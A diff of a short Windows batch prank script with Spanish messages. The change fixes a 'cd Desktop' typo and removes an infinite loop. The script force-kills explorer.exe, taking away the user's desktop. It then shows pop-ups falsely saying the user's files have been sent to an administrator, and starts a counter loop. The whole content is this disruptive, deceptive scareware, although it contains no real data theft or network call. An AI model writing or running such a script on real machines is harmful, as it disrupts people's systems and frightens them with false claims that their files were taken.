@@ -1,14 +1,12 @@
 echo off
 title Hola :)
-xd Desktop
+cd Desktop
 TASKKILL /F /IM explorer.exe
 msg * espere un momento.
 msg * espere un momento..
 msg * espere un momento...
 msg * los archivos han sido enviados al administrador correctamente
 set hoal = 1
-:bucle
-goto bucle
 :menu
 cls
 set /a hoal = %hoal% + 1
